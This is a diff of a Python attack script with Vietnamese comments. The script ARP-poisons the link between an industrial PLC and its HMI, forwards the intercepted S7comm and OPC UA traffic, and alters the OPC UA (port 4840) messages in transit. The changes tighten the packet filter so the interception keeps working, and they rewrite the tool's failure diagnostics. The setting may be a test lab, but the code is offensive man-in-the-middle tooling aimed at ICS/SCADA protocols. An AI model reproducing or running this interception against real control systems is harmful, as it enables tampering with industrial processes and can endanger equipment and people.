@@ -395,8 +395,11 @@ def main():
         time.sleep(2)
 
         if spoof_mode:
-            # Bat ca moi traffic giua 2 host de forward duy nhat, sua rieng 4840.
-            filter_str = f"host {plc_ip} and host {hmi_ip}"
+            # "tcp and host..." de LOAI goi ARP (ARP poison cua chinh minh
+            # cung match "host X and host Y" vi tham chieu 2 IP do -> nhieu, va
+            # ARP khong co lop IP nen has_ip=0). Chi bat TCP giua 2 host: forward
+            # ca S7comm (102) lan OPC UA (4840) de WinCC van song, sua rieng 4840.
+            filter_str = f"tcp and host {plc_ip} and host {hmi_ip}"
             cb = bridge_callback
         else:
             filter_str = f"tcp port {OPCUA_PORT}"
@@ -450,7 +453,7 @@ def main():
             f"victim_pair={victim_pair_count} forwarded={intercepted_count}"
         )
         if raw_seen_count == 0:
-            notes.append("CHET TANG 1: sniff khong thay goi nao -- sai IFACE hoac Npcap khong ap filter.")
+            notes.append("CHET TANG 1: sniff khong thay TCP nao giua PLC<->HMI -- web_scada CHUA POLL OPC UA luc chay, hoac sai IFACE. Bat web_scada tren controller roi chay lai.")
         elif victim_pair_count == 0:
             notes.append("CHET TANG 2: co goi nhung khong dung cap IP PLC<->HMI -- ARP poison chua chuyen huong duoc.")
         elif intercepted_count == 0:
